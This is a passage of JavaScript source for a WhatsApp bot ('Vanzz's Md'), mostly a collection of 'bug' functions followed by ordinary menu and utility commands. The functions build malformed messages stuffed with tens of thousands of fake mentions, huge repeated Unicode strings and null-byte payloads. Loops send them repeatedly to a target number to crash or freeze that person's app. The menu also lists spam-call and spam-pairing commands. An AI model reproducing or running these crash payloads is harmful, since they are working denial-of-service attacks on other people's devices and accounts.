        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

     {
        await conn.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}

async function protocolxaudio(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await conn.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

     {
        await conn.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "X" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function locationInvis(target) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                liveLocationMessage: {
                    degreesLatitude: -9.09999262999,
                    degreesLongitude: 199.99963118999,
                    caption: "New X-Voids Is Here͢ ϟ" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    sequenceNumber: '0',
                    jpegThumbnail: '',
                contextInfo: {
                    mentionedJid: Array.from({
                        length: 30000
                    }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    isSampled: true,
                    participant: target,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9741,
                    isForwarded: true
                }
            }
        }
    }
};

const msg = generateWAMessageFromContent(target, generateMessage, {});

await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
                tag: "to",
                attrs: {
                    jid: target
                },
                content: undefined
            }]
        }]
    }]
});
}

async function bulldozer(target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function DelayStickerNew(conn, target) {
  const stickerUrl = "https://mmg.whatsapp.net/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0&mms3=true";

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: target,
      fromMe: true,
      id: Date.now().toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: "image/webp",
        fileSha256: "CH6V5MN2Xl1XBEvRJ67jUo9B7PHVtfZzwo6iHC7E1ps=",
        fileEncSha256: "AFVKkyq/7/LocJByT0980T5h2I9qJrXgcukoBiZzAZk=",
        mediaKey: "h/8FwRZdeuDLx/C9JQLZd2YeeXdxIUH2/PO9QqXwOTw=",
        fileLength: { low: 38444, high: 0, unsigned: true }, 
        directPath: "/v/t62.15575-24/12403361_728544836168227_8186125427718522054_n.enc?ccb=11-4&oh=01_Q5Aa1gHBXGoY4nJ2M27pLZSUwWBxUGwDd0sR8TPg6SqZeDKKkA&oe=6847F87B&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746956112,
        firstFrameSidecar: "kk79ovc2beFGGA==",
        isAnimated: true,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        stickerSentTs: "1746957642619",
        contextInfo: {
          mentionedJid          
        }
      }
    }
  };

  await conn.relayMessage(target, stickerMsg.message, { messageId: stickerMsg.key.id });
  console.log(`[StickerDelay] Terkirim ke ${target}`);
}

async function Blank_Pack(target) {
let memeknya = "ꦾ".repeat(50000) + " ꦽ".repeat(5000);
    var messageContent = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
  stickerPackMessage: {
    stickerPackId: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0",
    name: "Ken Blank" + memeknya,
    publisher: memeknya + `ꦾ`.repeat(5000),
    stickers: [
      {
        fileName: "rroK-d0l9EdduolvylB3XF6RKwnyiz0RKAQMWb7RMl4=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      },
      {
        fileName: "JWKop+ILOcOMUNvxzJ52pUKwzWEgMbYkKFlo-aBKcfY=.webp",
        isAnimated: false,
        emojis: [
          ""
        ],
        accessibilityLabel: "",
        isLottie: false,
        mimetype: "image/webp"
      }
    ],
    fileLength: "69832",
    fileSha256: "J1qUbwUO4z77FRY3YcJ2DsQkL+SLTYhvacH2jfcZZNk=",
    fileEncSha256: "2ZEtY/Lfza1MYM6yU7jvCNwFTsYKHLuU7d6XwX/1W5c=",
    mediaKey: "A192qGyrnYXtdftrXGS1/R/3qcB6wG46ybFNvuXw0w8=",
    directPath: "/v/t62.15575-24/27352554_9405543626240762_2450036504553609989_n.enc?ccb=11-4&oh=01_Q5Aa1QFxiY3tujF8LmhWFx_gf4uMfQ2e544QIygRxw6wqt78cw&oe=68406780&_nc_sid=5e03e0",
    contextInfo: {},
    mediaKeyTimestamp: "1746459896",
    trayIconFileName: "b58c0f42-0d1f-48fc-a516-7821f4d8d7a0.png",
    thumbnailDirectPath: "/v/t62.15575-24/11410555_1219244196575326_7771742087005735253_n.enc?ccb=11-4&oh=01_Q5Aa1QEE9w6Kxf3WA3mH-_CcLiRcGVM29PNP1OJ9Z-kwv1mzwg&oe=684036A4&_nc_sid=5e03e0",
    thumbnailSha256: "UJxXSKrCVS9g/e/Ai39k62XEeTETrof25srXus8fkSA=",
    thumbnailEncSha256: "ufsZpeTyo10n1OPuYUsqPO01W6/vTrSepULAicGOFi8=",
    thumbnailHeight: 252,
    thumbnailWidth: 252,
    imageDataHash: "M2UxNGQzOGE0NThhM2VmNWFkYTUyZmQ3NzE0MWMwNWZjZjkwODM3NjFjOTY4MDljZjVhOWY0ZWVmZGU3ZWI3YQ==",
    stickerPackSize: "69233",
    stickerPackOrigin: "USER_CREATED"
              },
            },
          },
        }),
        {
          userJid: target,
        }
      );
await conn.relayMessage(target, messageContent.message, {
        participant: {
          jid: target,
        },
        messageId: messageContent.key.id,
      });
      console.log(chalk.green(`Send Bug By Ken : ${target}`));
    }

async function DilxzBlankUi(target) {
    for (let i = 0; i <= 50; i++) {
    await bulldozer(target)
    await locationInvis(target)
    await protocolxaudio(target)
    await protocol5(target)
    }
}

async function DilxzIosBlank(target) {
    for (let i = 0; i <= 50; i++) {
    await IosLocation(target)
    await TrashIos(target)
    }
}
                   
// end func bug
//===================================//

// — Fungsi Bug Utama [Funtion]

async function TrashLocIOS(target) {
await conn.relayMessage(target, {
locationMessage: {
degreesLatitude: -9.09999262999,
degreesLongitude: 199.99963118999,
jpegThumbnail: null,
name: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧" + "𑇂𑆵𑆴𑆿".repeat(10000),
address: "Wellcome_Screen",
url: `https://lol.crazyapple.${"🩸".repeat(25000)}.com`,
contextInfo: {
quotedAd: {
advertiserName: "x",
mediaType: "IMAGE",
jpegThumbnail: null,
caption: "x"
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
}
}
}
}, {})
}
async function InvisSqL(target) {
const Node = [
{
tag: "bot",
attrs: {
biz_bot: "1"
}
}
];

const msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16)
})
},
interactiveMessage: {
header: {
title: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧",
hasMediaAttachment: false,
imageMessage: {
url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
mimetype: "image/jpeg",
fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
fileLength: "11887",
height: 1080,
width: 1080,
mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1750124469",
jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
contextInfo: {
mentionedJid: [target],
participant: target,
remoteJid: target,
expiration: 9741,
ephemeralSettingTimestamp: 9741,
entryPointConversionSource: "WhatsApp.com",
entryPointConversionApp: "WhatsApp",
entryPointConversionDelaySeconds: 9742,
disappearingMode: {
initiator: "INITIATED_BY_OTHER",
trigger: "ACCOUNT_SETTING"
}
},
scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
scanLengths: [2071, 6199, 1634, 1983],
midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
}
},
body: {
text: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧"
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000)
}
}
}
}
}, {});

await conn.relayMessage(target, msg.message, {
participant: { jid: target },
additionalNodes: Node,
messageId: msg.key.id
});
}
async function protocolbug5(target, mention) {
const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 40000 }, () =>
`1${Math.floor(Math.random() * 800000)}@s.whatsapp.net`
)
];

const embeddedMusic = {
musicContentMediaId: "589608164114571",
songId: "870166291800508",
author: ".RizxVelz Asistent" + "ោ៝".repeat(10000),
title: "Mark Zuckerberg",
artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
countryBlocklist: true,
isExplicit: true,
artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
};

const videoMessage = {
url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
fileLength: "289511",
seconds: 15,
mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
caption: "⛧ 尺izxᐯelz 𐍈fficial-Iᗪ ⛧",
height: 640,
width: 640,
fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
mediaKeyTimestamp: "1743848703",
contextInfo: {
isSampled: true,
mentionedJid: mentionedList
},
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
serverMessageId: 1,
newsletterName: global.NameSaluran
},
streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
annotations: [
{
embeddedContent: {
embeddedMusic
},
embeddedAction: true
}
]
};

const msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: { videoMessage }
}
}, {});

await conn.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: undefined }
]
}
]
}
]
});

if (mention) {
await conn.relayMessage(target, {
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25
}
}
}
}, {
additionalNodes: [
{
tag: "meta",
attrs: { is_status_mention: "true" },
content: undefined
}
]
});
}
}
// — Fungsi Bug Pengiriman
async function Xios_X(target) {
for (let i = 0; i <= 15; i++) {
await TrashLocIOS(target)
await sleep(500)
}
}
async function Xinvis_X(target) {
for (let i = 0; i <= 500; i++) {
await protocolbug5(target, false);
await sleep(500)
}
var file = await fs.readdirSync("./session")
var anu = await file.filter(i => i !== "creds.json")
for (let t of anu) {
await fs.unlinkSync(`./session/${t}`)
}
process.exit(0)
}
// —# Fungai Function Pengiriman Case Bug
const crashFunctions = {
xios: Xios_X,
force: InvisSqL,
xinvis: Xinvis_X,
};

//delay 5 menit

async function resdidu(target, z) {
    let biji = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "⭑‌🦠⃟⃰Ꮡ‌‌𝐃‌ 𝐄‌𝐕‌𝚹‌‌𝐑‌𝐒⃟𝐢𝐗‌𝐂‌‌𝛀 𝐑‌𝚺‌ ⋆‣ 🫀⃟⃰‌᪻𝐓𝐝‌𝐗᪻‌‌⃪😈⃘ႊ𝙸𝚗𝚜‌𝚝𝚊𝚗‌𝚃𝚒𝚌𝚔⃜🔃",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000), // trigger (you can replace it with 0002)
                        version: 3
                    }
                }
            }
        }
    }, {
        // ❗ Essential properties for messages to be sent
        ephemeralExpiration: 0,
        forwardingScore: 0,
        isForwarded: false,
        font: Math.floor(Math.random() * 9),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    });

    await conn.relayMessage("status@broadcast", biji.message, {
        messageId: biji.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    await sleep(500);

    // ❗ If the z parameter is true, a follow up message will be sent. but i don't recommend it.
    if (z) {
        await conn.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: biji.key,
                        type: 25, // enum 25 > STATUS_MENTION_MESSAGE
                    },
                },
            },
        }, {});
    }
}
//jjssror


    let totalfitur = () => {
      var mytext = fs.readFileSync("./start/system.js").toString();
      var numUpper = (mytext.match(/case '/g) || []).length;
      return numUpper;
    };

async function reply(teks) {
conn.sendMessage(m.chat, {
text: teks,
mentions: conn.ments(teks),
isForwarded: true
}, {quoted: m})
}

switch (command) {
case "van": {
let anj = `
Indonesian 🇮🇩 : Hallo 👋, Saya Vanzz's Md Versi Terbaru Yang Dikembangkan Oleh VanzzR

English 🇬🇧 : Hello 👋, I am Vanzz's Md Latest Version Development By VanzzR

┏[ 📍 ] Information Bot
┃ ☘︎ Developer : Vanzzr
┃ ☘︎ Bot Name : Vanzz's Md
┃ ☘︎ Bot Version : 2.0.0
┗━━━━━━━━━━━━━⬣

┏[ 🌐 ] Owner's Menu
┃ ☘︎ Addprem *Number/Tag*
┃ ☘︎ Delprem *Number/Tag*
┃ ☘︎ savekontak *In Place*
┃ ☘︎ pushkontak *Id*
┗━━━━━━━━━━━━━⬣

┏[ 🐉 ] Md Menu
┃ ☘︎ brat *Text*
┃ ☘︎ bratvid  *Text*
┃ ☘︎ qc  *Text*
┃ ☘︎ hd  *Reply Image*
┃ ☘︎ sticker  *Reply Image*
┃ ☘︎ tourl  *Reply Image*
┃ ☘︎ rvo *Reply Image*
┃ ☘︎ play  *Judul Lagu*
┃ ☘︎ vantwo *( Second Menu )*
┗━━━━━━━━━━━━━⬣

`
conn.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/f5h19x.jpeg" },
        caption: anj,
                    })
                    }
break

case "vantwo": {
let anj = `
Indonesian 🇮🇩 : Hallo 👋, Saya Vanzz's Md Versi Terbaru Yang Dikembangkan Oleh VanzzR

English 🇬🇧 : Hello 👋, I am Vanzz's Md Latest Version Development By VanzzR

┏[ 📍 ] Information Bot
┃ ☘︎ Developer : Vanzzr
┃ ☘︎ Bot Name : Vanzz's Md
┃ ☘︎ Bot Version : 2.0.0
┗━━━━━━━━━━━━━⬣

┏[ 🌐 ] Owner Menu
┃ ☘︎ clc  *Numero*
┃ ☘︎ ban  *Numero*
┃ ☘︎ unban  *Numero*
┃ ☘︎ spampairing  *Numero*
┃ ☘︎ spamcall  *Numero*
┃ ☘︎ getpp  *Numero*
┗━━━━━━━━━━━━━⬣

┏[ 🐉 ] Md Menu
┃ ☘︎ translate *Text*
┃ ☘︎ removebg  *Reply Image*
┃ ☘︎ hytamkan  *Reply Image*
┃ ☘︎ toprompt  *Reply Image*
┗━━━━━━━━━━━━━⬣

┏[ 💾 ] Downloader Menu
┃ ☘︎ mediafire *Link*
┃ ☘︎ tiktok  *Link*
┃ ☘︎ savepin  *Link*
┃ ☘︎ gdrive  *Link*
┃ ☘︎ cloudku  *Link*
┃ ☘︎ ssweb  *Link*
┃ ☘︎ spotifydl *Link*
┃ ☘︎ happymod  *Name Game*
┗━━━━━━━━━━━━━⬣

┏[ 🔎 ] Search menu
┃ ☘︎ topnetflix
┃ ☘︎ cekbola
┃ ☘︎ cekip
┃ ☘︎ soundcloudsearch
┃ ☘︎ ytsearch
┃ ☘︎ soundcloudsearch
┃ ☘︎ soundcloudsearch
┗━━━━━━━━━━━━━⬣

┏[ 🎮 ] Game Menu
┃ ☘︎ apakah  *Text*
┃ ☘︎ bisakah  *Text*
┃ ☘︎ kapankah  *Text*
┃ ☘︎ cekkhodam  *Text*
┃ ☘︎ cekganteng  *Text*
┃ ☘︎ cekcantik  *Text*
┃ ☘︎ cekhusbu  *Text*
┃ ☘︎ cekwaifu  *Text*
┃ ☘︎ cekjodoh  *Text*
┃ ☘︎ cekkontol  *Text*
┃ ☘︎ cekkpribadian  *Text*
┃ ☘︎ cekkmasadepan  *Text*
┃ ☘︎ cekhobi  *Text*
┃ ☘︎ cekkaya  *Text*
┃ ☘︎ cekgay  *Text*
┃ ☘︎ cekrajaiblis  *Text*
┃ ☘︎ cekstress  *Text*
┃ ☘︎ ceklesbi  *Text*
┃ ☘︎ cekdongo  *Text*
┃ ☘︎ ceksange  *Text*
┃ ☘︎ mitos
┃ ☘︎ jokes
┃ ☘︎ faktaunik
┃ ☘︎ faktakucing
┃ ☘︎ wargagb
┃ ☘︎ quotesgalau
┃ ☘︎ truth
┃ ☘︎ dare
┗━━━━━━━━━━━━━⬣

┏[ 👥 ] Group Menu
┃ ☘︎ ht  *Text*
┃ ☘︎ add  *Numero*
┃ ☘︎ kick  *Numero/Reply*
┃ ☘︎ tagall
┃ ☘︎ culikaman
┃ ☘︎ outallgc
┃ ☘︎ cekidgb
┃ ☘︎ cekidch
┃ ☘︎ kickall
┃ ☘︎ totalfitur
┗━━━━━━━━━━━━━⬣
`
conn.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/f5h19x.jpeg" },
        caption: anj,
                    })
                    }
break

// start case add/md

case "rvo": case "readviewonce": {
if (!Access) return reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
      conn.sendMessage(from, {
        react: {
          text: "🔎",
          key: m.key
        }
      })
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return conn.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return conn.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return conn.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

case "tourl": {
if (!/image/.test(mime)) return m.reply("dengan kirim/reply foto")
let media = await conn.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'conn.png');

let teks = directLink.toString()
await conn.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break;

case 'remini':
case 'hdr':
case 'hd': {

if (!quoted) return reply(`mna foto nya tolol`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
await conn.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})

let startTime = Date.now(); 

await reply(`⚠️ Mohon tunggu sebentar, proses anda dimulai...\n\n⏳ Proses ini membutuhkan waktu lama untuk menggunakannya, mohon bersabar.`);

let BodyForm = require('form-data')
async function CatBox(filePath) {
	try {
		const fileStream = fs.createReadStream(filePath);
		const formData = new BodyForm();
		formData.append('fileToUpload', fileStream);
		formData.append('reqtype', 'fileupload');
		formData.append('userhash', '');
		const response = await axios.post('https://catbox.moe/user/api.php', formData, {
			headers: {
				...formData.getHeaders(),
			},
		});
		return response.data;
	} catch (error) {
		console.error("Error at Catbox uploader:", error);
		return "Terjadi kesalahan saat upload ke Catbox.";
	}
};

if (/remini/.test(command)) cap = `*ᴛʏᴘᴇ :*  ʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
if (/hd/.test(command)) cap = `*ᴛʏᴘᴇ :*  ʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
if (/hdr/.test(command)) cap =  `*ᴛʏᴘᴇ :*  ʜᴅ \n* ʀᴇsᴜʟᴛ : sᴜᴄᴄᴇss`;
let media = await conn.downloadAndSaveMediaMessage(quoted);
try {
let catBoxUrl = await CatBox(media);
console.log('CatBox URL:', catBoxUrl);
let anjai = await fetchJson(`https://api.hanggts.xyz/imagecreator/upscale?url=${catBoxUrl}`)
let result = anjai.result
conn.sendMessage(m.chat, { image: { url: result }, caption: cap }, { quoted: m })
} catch (error) {
console.error(error);
}
}
    break
  
      case "totalfitur": {
          reply(`fitur ny sgni : ${totalfitur()}`);
        }
        break;
       
      case "ban": {
if (!Access) return reply(mess.owner)
          let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await conn.updateBlockStatus(users, "block");
          await reply(`done puki`);
        }
        break;
      case "unban": {
if (!Access) return reply(mess.owner)
          let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await conn.updateBlockStatus(users, "unblock");
          await reply(`done puki`);
        }
        break;

      case "clc": {
